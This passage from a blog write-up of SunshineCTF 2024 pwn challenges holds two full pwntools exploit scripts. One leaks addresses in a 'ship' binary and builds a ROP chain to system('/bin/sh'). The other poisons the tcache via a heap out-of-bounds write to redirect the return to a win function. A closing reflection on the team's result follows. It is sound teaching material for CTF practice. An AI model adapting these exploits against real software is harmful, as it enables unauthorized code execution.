+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./ship&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 2024.sunshinectf.games 24003&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">row, column,<span class="built_in">ascii</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the row (0-9, a-f) &gt;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(row).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Enter the column (0-9, a-f) &gt;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(column).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Choose missile type - Tomahawk (T), Hellfire (H), SideWinder (S), Custom (C) &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter a custom missile as a single ASCII character &gt;&gt;&gt; &#x27;</span>,<span class="built_in">ascii</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">leakPIE = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">if</span> REMOTE_LOCAL == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        attack(<span class="number">37</span>,<span class="number">8</span>+i,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        attack(<span class="number">35</span>,<span class="number">8</span>+i,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    rcu(<span class="string">b&#x27;from &#x27;</span>)</span><br><span class="line">    leakPIE += <span class="built_in">int</span>(rcl()[:<span class="number">2</span>],<span class="number">16</span>) &lt;&lt; i*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">PIEbase = leakPIE - <span class="number">0x1437</span></span><br><span class="line"></span><br><span class="line">pop_rdi = PIEbase + <span class="number">0x1754</span></span><br><span class="line">system_plt = PIEbase + <span class="number">0x1060</span></span><br><span class="line">ret = pop_rdi + <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">attack(<span class="number">0</span>,<span class="number">20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;&lt;&lt;&lt; Fired outside board, corrupting &#x27;</span>)</span><br><span class="line">leakstack = <span class="built_in">int</span>(rcl()[:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.system(&#x27;echo &#x27;+hex(leakstack)+&#x27;&gt; a.txt&#x27;) # use debug</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binsh)):</span><br><span class="line">    attack(<span class="number">0</span>, <span class="number">1</span>+i, binsh[i])</span><br><span class="line"></span><br><span class="line">binsh_addr = leakstack - <span class="number">19</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n * row + column</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">33</span>,<span class="number">8</span>+i,(pop_rdi &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">attack(<span class="number">33</span>,<span class="number">14</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">33</span>,<span class="number">15</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write pop rdi**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">34</span>,i,(binsh_addr &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line">attack(<span class="number">34</span>,<span class="number">6</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">34</span>,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write /bin/sh**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">34</span>, i+<span class="number">8</span> , (ret &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line">attack(<span class="number">34</span>,<span class="number">14</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">34</span>,<span class="number">15</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write ret**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    attack(<span class="number">35</span>,i,(system_plt &gt;&gt; (i * <span class="number">8</span>) &amp; <span class="number">0xff</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line">attack(<span class="number">35</span>,<span class="number">6</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">attack(<span class="number">35</span>,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;**success write system**&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger ret address</span></span><br><span class="line">attack(<span class="number">32</span>,<span class="number">12</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAKPIE&#x27;</span>,<span class="built_in">hex</span>(leakPIE))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;PIE BASE&#x27;</span>,<span class="built_in">hex</span>(PIEbase))</span><br><span class="line"><span class="built_in">print</span>(leakstack)</span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+<h2 id="heap01"><a href="#heap01" class="headerlink" title="heap01"></a>heap01</h2><p>glibc 2.35<br>It has oob on heap(two times).</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">inp = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">v2[inp] = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;The chunk is still hungry... let&#x27;s fill it up some more!\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">v4 = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">v2[v4] = get_inp();</span><br></pre></td></tr></table></figure>
+<p>We can write tcache_pthread_struct.<br>write tcache entry to stack(the binary give me stack) and tcache count(Must same as tcache entry size).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache entry[1] -&gt; stack address on ret address</span><br></pre></td></tr></table></figure>
+
+<p>when malloc chunk, we will get fake chunk on stack.<br>write ret address to win function</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="built_in">malloc</span>(size); <span class="comment">// malloc stack</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value 1: &quot;</span>); <span class="comment">// write old rbp</span></span><br><span class="line">*v5 = get_inp(); </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value 2 - &quot;</span>); <span class="comment">// write ret address to win </span></span><br><span class="line">v5[<span class="number">1</span>] = get_inp();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Value 3 -&gt; &quot;</span>);</span><br><span class="line">v5[<span class="number">2</span>] = get_inp();</span><br></pre></td></tr></table></figure>
+
+<h3 id="script-6"><a href="#script-6" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./heap01&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 2024.sunshinectf.games 24006&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line">win_address = <span class="number">0x40126b</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Do you want a leak? &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">leak_stack = <span class="built_in">int</span>(rcls(<span class="number">2</span>)[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Enter chunk size: &#x27;</span>,<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;-578&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(leak_stack))</span><br><span class="line">sla(<span class="string">b&#x27;Value: &#x27;</span>,<span class="built_in">str</span>(leak_stack+<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;-596&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Value: &#x27;</span>,<span class="string">b&#x27;281479271743489&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Value 1: &#x27;</span>,<span class="built_in">str</span>(win_address+<span class="number">0x5</span>))</span><br><span class="line">sla(<span class="string">b&#x27;Value 2 - &#x27;</span>,<span class="built_in">str</span>(win_address+<span class="number">0x5</span>))</span><br><span class="line">sla(<span class="string">b&#x27;Value 3 -&gt; &#x27;</span>,<span class="built_in">str</span>(win_address+<span class="number">0x5</span>))</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAK STACK&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="after"><a href="#after" class="headerlink" title="after"></a>after</h2><p>Last year, Aukro, WH, and I played our first CTF together, starting with SunshineCTF 2023. We stayed up late solving challenges, and the most memorable one was extracting a git bundle, which we worked on until the middle of the night. After all the discussions, we finally finished in 76th place.</p>
+<p>A year later, we came back to SunshineCTF. After clearing the scripting challenges, I play with Aukro on pwn (as a weber, I spent the whole time watching pwn, haha). We managed to solve 3 out of 6 pwn challenges and finished all pwn challenge with Aukro.</p>
+<p>WAN ended up taking 10th place, marking my first top 10 finish on CTFtime. This also brought back the pure joy I once felt playing CTFs.</p>
+<p>I really love that feeling in CTFs where everyone works together, stays up late solving challenges, and cheers when we finally solve them. It feels like staying up late playing video games, lol.</p>
+<p>In the future, I’ll keep walking down the path of cybersecurity and CTFs. Thanks to WAN, CakeisTheFake, and all the partners I’ve studied cybersecurity with, as well as the seniors who taught me so much.</p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/10/02/Pwnable-bookwriter/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
